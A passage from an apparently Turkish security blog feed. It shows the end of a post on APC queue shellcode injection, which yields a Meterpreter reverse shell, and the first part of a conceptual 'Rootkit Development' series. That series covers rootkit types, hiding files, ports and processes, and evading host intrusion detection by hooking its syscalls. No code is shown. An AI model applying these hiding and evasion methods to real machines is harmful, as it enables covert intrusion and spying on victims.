&lt;p&gt;Daha da basiti : &lt;strong&gt;SleepEx&lt;/strong&gt;‘i içeren bir &lt;strong&gt;Thread&lt;/strong&gt; ise &lt;strong&gt;Shellcode&lt;/strong&gt; çalışıyor.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Döngü&lt;/strong&gt;‘nün son kodu olarak eklediğim &lt;strong&gt;getchar&lt;/strong&gt; bunu sağlıyor aslında.&lt;/p&gt;

&lt;p&gt;Yani eğer &lt;strong&gt;Shellcode&lt;/strong&gt;‘u ekleyeceği doğru &lt;strong&gt;Thread&lt;/strong&gt; değilse &lt;strong&gt;ENTER&lt;/strong&gt; tuşuna basıp program içerisindeki başka bir &lt;strong&gt;Thread&lt;/strong&gt;‘ı deneyebiliyoruz.&lt;/p&gt;

&lt;p&gt;Ama &lt;strong&gt;Kurban&lt;/strong&gt; yazılım içerisinde sadece bir &lt;strong&gt;APC&lt;/strong&gt; fonksiyonu kullandığımızdan oda &lt;strong&gt;SleepEx&lt;/strong&gt; fonksiyonu olduğundan ilk &lt;strong&gt;Thread&lt;/strong&gt;‘da direk &lt;strong&gt;Meterpreter&lt;/strong&gt;‘den &lt;strong&gt;reverse_tcp&lt;/strong&gt; yani erişimi alacağızdır.&lt;/p&gt;

&lt;h3 id=&quot;proof-of-concept--poc-&quot;&gt;Proof Of Concept ( PoC )&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Saldırgan&lt;/strong&gt; ve &lt;strong&gt;Kurban&lt;/strong&gt; yazılımlarının &lt;strong&gt;APC Queue Code Injection&lt;/strong&gt; etkileşiminin gerçekleştiği bir video hazırladım bakmak isterseniz.&lt;/p&gt;

&lt;p&gt;Video : &lt;a href=&quot;https://www.youtube.com/watch?v=KmrTowxl6Ho&quot;&gt;APC Queue Code Injection PoC&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;the-end&quot;&gt;THE END&lt;/h1&gt;
&lt;p&gt;Bu yazının sonuna da geldik.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Process Shellcode Injection&lt;/strong&gt; tekniklerinden sadece bir tanesidir bu.&lt;/p&gt;

&lt;p&gt;Daha önce &lt;strong&gt;Process Shellcode Injection&lt;/strong&gt; nedir hakkında bir yazı yayınladım eğer anlayamayan olduysa bu yazıyı.&lt;/p&gt;

&lt;p&gt;Bakmanızı öneririm : &lt;a href=&quot;https://blacknbunny.github.io/2019/04/28/Process-Shellcode-Injection.html&quot;&gt;Process Shellcode Injection&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Introduction to APC, Thread and APC Code Injection</summary></entry><entry><title type="html">Rootkit Development - (Part 1)</title><link href="http://localhost:4000/2019/05/29/rootkit-development-part-1.html" rel="alternate" type="text/html" title="Rootkit Development - (Part 1)" /><published>2019-05-29T00:00:00+03:00</published><updated>2019-05-29T00:00:00+03:00</updated><id>http://localhost:4000/2019/05/29/rootkit-development-part-1</id><content type="html" xml:base="http://localhost:4000/2019/05/29/rootkit-development-part-1.html">&lt;h1 id=&quot;rootkit-development---part-1&quot;&gt;Rootkit Development - (Part 1)&lt;/h1&gt;

&lt;p&gt;Merhaba arkadaşlar.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Rootkit Development&lt;/strong&gt;‘in ilk part’ına hoşgeldiniz.&lt;/p&gt;

&lt;p&gt;Bu yazımızda bir &lt;strong&gt;Rootkit&lt;/strong&gt;‘in ne olduğunu tam olarak anlayacağız.&lt;/p&gt;

&lt;p&gt;Aynı zamanda &lt;strong&gt;Rootkit&lt;/strong&gt;‘ler ile daha haşır neşir olacağız.&lt;/p&gt;

&lt;p&gt;Bu yazının başında önemli bir açıklama olarak şunu söylemek istiyorum bu &lt;strong&gt;Rootkit Development&lt;/strong&gt; serisinden sonra oluşabilecek durumlardan ben sorumlu değilim.&lt;/p&gt;

&lt;p&gt;Bunun dışında bu &lt;strong&gt;Rootkit Development&lt;/strong&gt; serisi hem &lt;strong&gt;Windows&lt;/strong&gt; hem &lt;strong&gt;Linux&lt;/strong&gt; aynı zamanda da &lt;strong&gt;Mac OS&lt;/strong&gt; işletim sistemleri için geçerli olan bilgileri içermektedir.&lt;/p&gt;

&lt;p&gt;Yani daha basit bir şekilde &lt;strong&gt;Ortaya karışık birşeyler yap usta&lt;/strong&gt; denildikten sonra bu yazıyı yazmış bulunmaktayım.&lt;/p&gt;

&lt;p&gt;Seri sonunda &lt;strong&gt;Rootkit Geliştirmek&lt;/strong&gt;, &lt;strong&gt;Rootkitleri tanımak&lt;/strong&gt;, &lt;strong&gt;Kernel&lt;/strong&gt;, &lt;strong&gt;Software Sec&lt;/strong&gt;, &lt;strong&gt;Hardware Sec&lt;/strong&gt; vs … gibi cümleler ve kelimelerle daha haşır neşir olacağız.&lt;/p&gt;

&lt;p&gt;Ve bunlar dışında &lt;strong&gt;Kernel&lt;/strong&gt;, &lt;strong&gt;Hooking&lt;/strong&gt;, &lt;strong&gt;Tracing&lt;/strong&gt;, &lt;strong&gt;HIDS&lt;/strong&gt; gibi anahtar kelimeler ile daha da yakınlaşacağız.&lt;/p&gt;

&lt;p&gt;Bu yazıda fazla teknik detaya girmeden aşşağıdaki konuları anlatacağım :&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Rootkit Nedir ?&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Rootkit Tipleri Nelerdir ?&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Rootkit Gizlenme Süreçleri Nelerdir ?&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;HIDS Nedir ?&lt;/strong&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;strong&gt;HIDS’ler nasıl bypass edilir ?&lt;/strong&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Logging, Tracing, Hooking Nedir ?&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;Hooking Türleri Nelerdir ?&lt;/strong&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;strong&gt;System Calls&lt;/strong&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;strong&gt;Hooking System Call&lt;/strong&gt;&lt;/li&gt;
              &lt;li&gt;&lt;strong&gt;System Call Modules&lt;/strong&gt;
                &lt;ul&gt;
                  &lt;li&gt;&lt;strong&gt;System Call Function&lt;/strong&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;strong&gt;sysent Structure&lt;/strong&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;strong&gt;Offset Value&lt;/strong&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;strong&gt;modfind Function&lt;/strong&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;strong&gt;modstat Function&lt;/strong&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;strong&gt;syscall Function&lt;/strong&gt;&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;strong&gt;Network Connections&lt;/strong&gt;&lt;/li&gt;
          &lt;li&gt;&lt;strong&gt;Processes&lt;/strong&gt;&lt;/li&gt;
          &lt;li&gt;&lt;strong&gt;BSD Communication Protocols&lt;/strong&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;strong&gt;protosw Structure&lt;/strong&gt;&lt;/li&gt;
              &lt;li&gt;&lt;strong&gt;inetsw[] Switch Table&lt;/strong&gt;&lt;/li&gt;
              &lt;li&gt;&lt;strong&gt;mbuf Structure&lt;/strong&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;Kernel Process Tracing Nedir ?&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;Keystroke Logging&lt;/strong&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Kernel Object Nedir ?&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;Direct Kernel Object Manipulation&lt;/strong&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;Rootkit Development&lt;/strong&gt;‘in ilk partında yer vereceğim konular bunlar.&lt;/p&gt;

&lt;p&gt;Ikinci &lt;strong&gt;Rootkit Development&lt;/strong&gt; partında daha da teknik detaya ineceğiz.&lt;/p&gt;

&lt;h1 id=&quot;rootkit-nedir-&quot;&gt;Rootkit Nedir ?&lt;/h1&gt;

&lt;p&gt;Bir &lt;strong&gt;Rootkit&lt;/strong&gt;‘e kök kullanıcı takımı denilebilir.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Rootkit&lt;/strong&gt; bulunduğu işletim sisteminin &lt;strong&gt;Kernel API&lt;/strong&gt;‘sini &lt;strong&gt;Hook&lt;/strong&gt; ederek çalışmaktadır genellikle.&lt;/p&gt;

&lt;p&gt;Yani &lt;strong&gt;Sistem Çağrı&lt;/strong&gt;‘larını kendi alehine kullanıp &lt;strong&gt;Dosya&lt;/strong&gt;, &lt;strong&gt;Process&lt;/strong&gt; vs.. gizleyebilmektedir.&lt;/p&gt;

&lt;p&gt;Daha da basit bir şekilde bir &lt;strong&gt;Rootkit&lt;/strong&gt; sistem içerisinde &lt;strong&gt;Programları&lt;/strong&gt;, &lt;strong&gt;Dosyaları&lt;/strong&gt;, &lt;strong&gt;Internet Bağlantılarını&lt;/strong&gt;, &lt;strong&gt;Servisleri&lt;/strong&gt;, &lt;strong&gt;Driverleri&lt;/strong&gt; hatta  &lt;strong&gt;İşletim Sistem&lt;/strong&gt;‘ini kontrol edebilmektedir.&lt;/p&gt;

&lt;p&gt;Bunun yanı sıra sistem içerisinde bulunan &lt;strong&gt;TCP&lt;/strong&gt;, &lt;strong&gt;UDP&lt;/strong&gt;, &lt;strong&gt;ICMP&lt;/strong&gt; vs.. gibi internet protokollerini manipule edebilmektedir.&lt;/p&gt;

&lt;p&gt;Ayrıca arkada çalıştırdığı bir &lt;strong&gt;Backdoor&lt;/strong&gt;‘un dinlediği &lt;strong&gt;Port&lt;/strong&gt; adresini &lt;strong&gt;IP&lt;/strong&gt; adresini gizleyebilmektedir.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Mac&lt;/strong&gt;, &lt;strong&gt;Windows&lt;/strong&gt;, &lt;strong&gt;Linux&lt;/strong&gt; işletim sistemlerinde &lt;strong&gt;Rootkit&lt;/strong&gt; terimi çokta farklı değildir.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Rootkit&lt;/strong&gt; terimine daha da yakından bakacak olursak şayet :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Bir &lt;strong&gt;Rootkit&lt;/strong&gt; kendisini veyahut &lt;strong&gt;Zararlı Yazılım&lt;/strong&gt;‘ı gizlemek için kullanılabilir.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;Aynı zamanda bir &lt;strong&gt;C&amp;amp;C&lt;/strong&gt; yani &lt;strong&gt;Command and Control&lt;/strong&gt; sunucusu olarak sistem içerisinde kullanılabilir. Aşağıdaki resim &lt;strong&gt;rootkit.com&lt;/strong&gt; tarafından geliştirilmiş &lt;strong&gt;Win2k Rootkit&lt;/strong&gt;‘inin komutlarını içermektedir.
    &lt;ul&gt;
      &lt;li&gt;&lt;img src=&quot;https://resmim.net/f/MC3Qrx.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Görülebildiği üzere sistem içerisinde komut çalıştırmak ve &lt;strong&gt;Klasör, Process&lt;/strong&gt; gizlemek mümkün. Ayrıca &lt;strong&gt;sniffkeys&lt;/strong&gt; ile &lt;strong&gt;klavye&lt;/strong&gt;‘de basılan tuşları yakalamakta mümkün.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;Tabi bunlar bir &lt;strong&gt;Rootkit&lt;/strong&gt;‘in yapabileceklerinden bir kaç tanesi.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Tabi şöyle bir soru sormak mümkün : &lt;strong&gt;Malware&lt;/strong&gt; ile &lt;strong&gt;Rootkit&lt;/strong&gt; arasında ne gibi bir fark vardır ?&lt;/p&gt;

&lt;p&gt;Bu sorununda cevabı &lt;strong&gt;Rootkit&lt;/strong&gt;‘in normal bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin işleyişinden farklı olarak &lt;strong&gt;Sistem Çağrı&lt;/strong&gt;‘larını &lt;strong&gt;Kancalaması&lt;/strong&gt; yani &lt;strong&gt;Hook&lt;/strong&gt; etmesi mevcut.&lt;/p&gt;

&lt;p&gt;Daha önceki yazım olan &lt;a href=&quot;https://blacknbunny.github.io/2019/05/07/linux-system-call-hooking.html&quot;&gt;Linux System Call Hooking&lt;/a&gt; yazım içerisinde &lt;strong&gt;Rootkit&lt;/strong&gt;‘lerin nasıl çalıştığını az çok anlattım.&lt;/p&gt;

&lt;p&gt;Yalnız bu ve ileriki yazımda &lt;strong&gt;Rootkit&lt;/strong&gt; teriminin daha derinlerine dalacağız.&lt;/p&gt;

&lt;h1 id=&quot;rootkit-tipleri-nelerdir-&quot;&gt;Rootkit Tipleri Nelerdir ?&lt;/h1&gt;

&lt;p&gt;Basit bir şekilde &lt;strong&gt;Rootkit&lt;/strong&gt; tipleri :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Kernel Rootkit&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;Kernel&lt;/strong&gt; içerisinde çalışan bir &lt;strong&gt;Rootkit&lt;/strong&gt; tipidir. &lt;strong&gt;İşletim Sistemi&lt;/strong&gt;‘nin &lt;strong&gt;Kaynak Kodunu&lt;/strong&gt; değiştirip hatta silebilen bir &lt;strong&gt;Rootkit&lt;/strong&gt; tipidir.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Hardware or Firmware Rootkit&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;Hardware&lt;/strong&gt; ya da &lt;strong&gt;Firmware&lt;/strong&gt; içerisinde çalışan bir &lt;strong&gt;Rootkit&lt;/strong&gt; tipidir.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Hypervizor or virtualized Rootkit&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;Hypervizor&lt;/strong&gt; içerisinde çalışan aynı zamanda &lt;strong&gt;Sanallaştırılmış Rootkit&lt;/strong&gt; tipidir. &lt;strong&gt;Boot-up&lt;/strong&gt; kavramında &lt;strong&gt;Kernel Rootkit&lt;/strong&gt;‘i &lt;strong&gt;Kernel&lt;/strong&gt; çalıştıktan sonra çalışır yalnız &lt;strong&gt;Hypervizor&lt;/strong&gt; içerisinde ilk önce &lt;strong&gt;Rootkit&lt;/strong&gt; çalışır dolayısıyla &lt;strong&gt;Kernel Rootkit&lt;/strong&gt;‘ten daha güçlüdür. &lt;strong&gt;Hypervizor&lt;/strong&gt; içeren herhangi bir durumda kendini gösterebilmektedir.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Bootloader Rootkit or Bootkit&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;Boot&lt;/strong&gt; içerisinde çalışan bir &lt;strong&gt;Rootkit&lt;/strong&gt; ve &lt;strong&gt;Bootkit&lt;/strong&gt; bizim &lt;strong&gt;İşletim Sistemimiz&lt;/strong&gt; ile aynı anda çalışmaya başlar. Kendini &lt;strong&gt;Master Boot Record (MBR)&lt;/strong&gt; ya da &lt;strong&gt;Volume Boot Record (VBR)&lt;/strong&gt;‘a enjekte etmektedir. Dolayısıyla bir &lt;strong&gt;Antivirüs&lt;/strong&gt;‘ün bu tipte bir &lt;strong&gt;Rootkit&lt;/strong&gt;‘i yakalaması çok zordur.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Memory Rootkit&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;Bir &lt;strong&gt;Memory Rootkit&lt;/strong&gt;‘i bizim &lt;strong&gt;RAM&lt;/strong&gt;‘ımız içerisinde saklanmaktadır. Dolayısıyla &lt;strong&gt;Ram Memory&lt;/strong&gt;‘si yani &lt;strong&gt;Hafızası&lt;/strong&gt; içerisinde manipule edebilme yetkisine sahiptir. Olabilecekleri siz düşünün.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;User-mode or application rootkit&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;Bir &lt;strong&gt;User-mode&lt;/strong&gt; ya da &lt;strong&gt;Application Rootkit&lt;/strong&gt;‘inin &lt;strong&gt;Antivirüs&lt;/strong&gt; tarafından bulunması kolaydır. Bu tipteki &lt;strong&gt;Rootkit&lt;/strong&gt;‘ler &lt;strong&gt;Aplikasyon&lt;/strong&gt; yani &lt;strong&gt;Yazılım&lt;/strong&gt; içerisinde saklanmaktadır. Ya da daha basit bir şekilde &lt;strong&gt;Kullanıcı&lt;/strong&gt;‘nın ulaşabildiği her kısma ulaşabilmektedir.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/vEevRU.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Yukarıda ki fotorafta en çok &lt;strong&gt;Yetkilendirilmiş&lt;/strong&gt; ve en az &lt;strong&gt;Yetkilendirilmiş&lt;/strong&gt; çekirdeğe giden yolu görebiliriz.&lt;/p&gt;

&lt;p&gt;Basit bir şekilde bir &lt;strong&gt;İşletim Sistemi&lt;/strong&gt;‘ni &lt;strong&gt;Dünya&lt;/strong&gt;‘ya benzetmek mümkün.&lt;/p&gt;

&lt;h1 id=&quot;rootkit-gizlenme-süreçleri-nelerdir-&quot;&gt;Rootkit Gizlenme Süreçleri Nelerdir ?&lt;/h1&gt;

&lt;p&gt;Bir &lt;strong&gt;Rootkit&lt;/strong&gt;‘in kendini gizleme süreci aşşağıdaki sıralamadan oluşmaktadır.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Örneğin &lt;strong&gt;ls&lt;/strong&gt; komutu içerisinde &lt;strong&gt;Çıktı&lt;/strong&gt; olarak karşımıza çıkan &lt;strong&gt;Dosyalar&lt;/strong&gt; arasında istediğimiz &lt;strong&gt;Dosya&lt;/strong&gt;‘yı gizlemeye yaramaktadır tabi bu sadece küçük bir örnek.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Bunu yapan basit bir &lt;strong&gt;Rootkit&lt;/strong&gt; geliştirmiştim &lt;a href=&quot;https://blacknbunny.github.io/2019/05/07/linux-system-call-hooking.html&quot;&gt;Linux System Call Hooking&lt;/a&gt; adlı yazımda.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Bir &lt;strong&gt;Rootkit&lt;/strong&gt; ayrıca &lt;strong&gt;İşletim Sistemi&lt;/strong&gt;‘nin &lt;strong&gt;Kaynak Kod&lt;/strong&gt;‘unu değiştirebildiğinden kendini normal bir &lt;strong&gt;Kullanıcı&lt;/strong&gt;‘nın ulaşamayacağı bir yere ekleyebilmektedir. Daha da basit şekilde &lt;strong&gt;Filesystem&lt;/strong&gt;‘imizden yani &lt;strong&gt;Dosya Sistemi&lt;/strong&gt;‘mizden farklı bir noktada çalıştırabilir kendisini.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Sistem Çağrıları&lt;/strong&gt;‘nı değiştirip &lt;strong&gt;İşletim Sistem&lt;/strong&gt;‘i içerisinde &lt;strong&gt;Kullanılan Portları&lt;/strong&gt; göstermekte kullanılan &lt;strong&gt;Komut&lt;/strong&gt;‘ları manipule edip kendini gizleyebilmektedir.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Ayrıca bir &lt;strong&gt;Rootkit&lt;/strong&gt; çalıştığı &lt;strong&gt;Process&lt;/strong&gt;‘i bu &lt;strong&gt;Process&lt;/strong&gt;‘leri göstermekte kullanılan &lt;strong&gt;Yazılımlar&lt;/strong&gt;‘dan kendini gizleyebilmektedir.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Tabi bunlar bir kaç tanesi. Bir &lt;strong&gt;Rootkit&lt;/strong&gt;‘in kendini gizlemesi için gerçekleştirebileceği senaryolar çok fazla.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;hids-nedir-&quot;&gt;HIDS Nedir ?&lt;/h3&gt;

&lt;p&gt;Şimdi diyebilirsiniz ki babacım sen bana &lt;strong&gt;Rootkit&lt;/strong&gt; yazmasını göster &lt;strong&gt;HIDS&lt;/strong&gt; ne ya geç bunları. Yalnız &lt;strong&gt;Rootkit&lt;/strong&gt; çok genel bir terim dolayısıyla içerdiği çoğu konuya değinmek istiyorum bu yazımda. Zaten &lt;strong&gt;Part 2&lt;/strong&gt;‘de çok çok daha derine inip kendi &lt;strong&gt;Rootkit&lt;/strong&gt;‘imizi bile geliştirebiliriz.&lt;/p&gt;

&lt;p&gt;O yüzden bunları bilmek ileride çok yarayacaktır.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/yF2AMg.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Açılımı &lt;strong&gt;Host-based Instrusion Detection System&lt;/strong&gt; olan &lt;strong&gt;HIDS&lt;/strong&gt; genel olarak &lt;strong&gt;Modification&lt;/strong&gt;‘ları &lt;strong&gt;Filesystem&lt;/strong&gt;‘de bulunan &lt;strong&gt;Dosya&lt;/strong&gt;‘lara kayıt edip göndermektedir.&lt;/p&gt;

&lt;p&gt;Daha da basit bir şekilde her bir dosyanın &lt;strong&gt;Hash&lt;/strong&gt;‘ini kendi &lt;strong&gt;Veritabanı&lt;/strong&gt;‘nda tutup belli bir süre aralığında bu dosyaları eskiden kayıt altına aldığı &lt;strong&gt;Hash&lt;/strong&gt;‘ler ile karşılaştırıp bir dosya içerisinde &lt;strong&gt;Değişiklik&lt;/strong&gt; oldu mu olmadı mı onu bulmak için vardır.&lt;/p&gt;

&lt;p&gt;Bunu anlatmamın sebebi ileride biz bir &lt;strong&gt;dosya&lt;/strong&gt; gizlemek istersek bu dosya üzerinde değişiklik yaptığımızı &lt;strong&gt;HIDS&lt;/strong&gt; anlayıp bunu engelleyecektir dolayısıylada &lt;strong&gt;Rootkit&lt;/strong&gt;‘imiz &lt;strong&gt;Çalışmak&lt;/strong&gt;‘ta sıkıntı çekecektir.&lt;/p&gt;

&lt;p&gt;Tabi bununda &lt;strong&gt;Bypass&lt;/strong&gt; yöntemi mevcut.&lt;/p&gt;

&lt;h3 id=&quot;hidsler-nasıl-bypass-edilir&quot;&gt;HIDS’ler nasıl bypass edilir?&lt;/h3&gt;

&lt;p&gt;Bu da işin komik tarafı.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;API Hooking&lt;/strong&gt;‘i engellemeye çalışırken kendisi &lt;strong&gt;System API&lt;/strong&gt;‘sini kullanıyor…&lt;/p&gt;

&lt;p&gt;Hani dedik ya &lt;strong&gt;Dosya&lt;/strong&gt;‘larda gerçekleşen değişiklikleri &lt;strong&gt;Hash&lt;/strong&gt; karşılaştırması ile buluyor.&lt;/p&gt;

&lt;p&gt;İyi güzel kardeşim buluyorsunda benim sorum &lt;strong&gt;Kendine&lt;/strong&gt; niye bakmıyorsun.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HIDS&lt;/strong&gt;‘leri &lt;strong&gt;Bypass&lt;/strong&gt; etmek için içerisinde kullandığı &lt;strong&gt;Sistem Çağrıları&lt;/strong&gt;‘nı &lt;strong&gt;Hook&lt;/strong&gt; edip çalışma şeklini değiştirebiliriz.&lt;/p&gt;

&lt;p&gt;Bu şekilde bu &lt;strong&gt;Yazılım&lt;/strong&gt; bizim istediğimiz şekilde çalışacaktır.&lt;/p&gt;

&lt;p&gt;Ve &lt;strong&gt;Yazılım&lt;/strong&gt;‘a bu &lt;strong&gt;Dosya&lt;/strong&gt;‘yı ya da şu &lt;strong&gt;Hash&lt;/strong&gt;‘i karşılaştırma diyebileceğiz.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HIDS&lt;/strong&gt;‘i kullanmakta olan bir sürü yazılım mevcut &lt;strong&gt;Monitoring&lt;/strong&gt; için.&lt;/p&gt;

&lt;p&gt;Bu yazılımlardan sistem içerisinde bir &lt;strong&gt;Rootkit&lt;/strong&gt; mevcut olduğunu karşı tarafın anlamasını engellemek için bu tür &lt;strong&gt;Yazılım&lt;/strong&gt;‘lar içerisinde değişiklik yapmamız gerekmekte.&lt;/p&gt;

&lt;h1 id=&quot;logging-tracing-hooking-nedir-&quot;&gt;Logging, Tracing, Hooking Nedir ?&lt;/h1&gt;

&lt;p&gt;Alttaki sıralamada bunların açıklamasını bulabilirsiniz :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Logging&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;Adından da anlaşılabileceği gibi &lt;strong&gt;Kayıt Tutmak&lt;/strong&gt;‘tır. Yalnız biz &lt;strong&gt;Rootkit&lt;/strong&gt;‘ler ile &lt;strong&gt;Yasal&lt;/strong&gt; yoldan değil &lt;strong&gt;Yasadışı&lt;/strong&gt; yoldan kayıt tutmaktayız. Dolayısıyla bir &lt;strong&gt;Rootkit&lt;/strong&gt;‘in içerisinde olmazsa olmazlardan biri &lt;strong&gt;Kayıt Tutma&lt;/strong&gt; işlemidir. Bu &lt;strong&gt;Kayıt Tutma&lt;/strong&gt; işlemi &lt;strong&gt;Kurban&lt;/strong&gt;‘dan alabildiğimiz tüm herşey dahildir. Örneğin &lt;strong&gt;Dosyalar&lt;/strong&gt;, &lt;strong&gt;Internet Bilgisi&lt;/strong&gt;, &lt;strong&gt;Internet Istekleri&lt;/strong&gt; vs…&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Tracing&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;Rootkit&lt;/strong&gt;‘ler tarafından kullanılan &lt;strong&gt;Basit&lt;/strong&gt; bir &lt;strong&gt;Debugging&lt;/strong&gt; işlemidir.&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;Yazılım&lt;/strong&gt; tarafından gerçekleştirilen her bir &lt;strong&gt;Kernel Operasyon&lt;/strong&gt;‘unu kayıt altına almak denilebilir buna kısaca. &lt;strong&gt;Kernel Operasyon&lt;/strong&gt;‘larından bazıları :
        &lt;ul&gt;
          &lt;li&gt;&lt;strong&gt;System Call&lt;/strong&gt;&lt;/li&gt;
          &lt;li&gt;&lt;strong&gt;I/O&lt;/strong&gt;&lt;/li&gt;
          &lt;li&gt;&lt;strong&gt;Signals&lt;/strong&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Yukarıdaki listede bulunan &lt;strong&gt;Operasyon&lt;/strong&gt;‘ları bir &lt;strong&gt;Rootkit Trace&lt;/strong&gt; ederek gözlemleyebilmektedir. Dolayısıyla &lt;strong&gt;Yazılım&lt;/strong&gt;‘ın nasıl çalıştığını bu şekilde izleyebilmektedir.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Hooking&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;Türkçe meali ile &lt;strong&gt;Kancalama&lt;/strong&gt; denilebilir. Bir &lt;strong&gt;Sistem Çağrısı&lt;/strong&gt;‘nı &lt;strong&gt;Kancalamak&lt;/strong&gt; basit bir şekilde o &lt;strong&gt;Sistem Çağrısı&lt;/strong&gt;‘nın yerine kendi oluşturduğumuz &lt;strong&gt;Sistem Çağrısı&lt;/strong&gt;‘nı koyup &lt;strong&gt;Manipule&lt;/strong&gt; etmektir.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;hooking-türleri-nelerdir-&quot;&gt;Hooking Türleri Nelerdir ?&lt;/h2&gt;

&lt;p&gt;Basit bir şekilde &lt;strong&gt;Hooking Türleri&lt;/strong&gt;‘ni aşşağıda sıraladım.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;API Hooking&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;API Hooking&lt;/strong&gt; kullanılan &lt;strong&gt;İşletim Sistemi&lt;/strong&gt;‘nin &lt;strong&gt;API&lt;/strong&gt;‘sinde ki &lt;strong&gt;Fonksiyon&lt;/strong&gt;‘ları ya da &lt;strong&gt;Kütüphane&lt;/strong&gt;‘leri &lt;strong&gt;Kancalamaktır&lt;/strong&gt;.&lt;/li&gt;
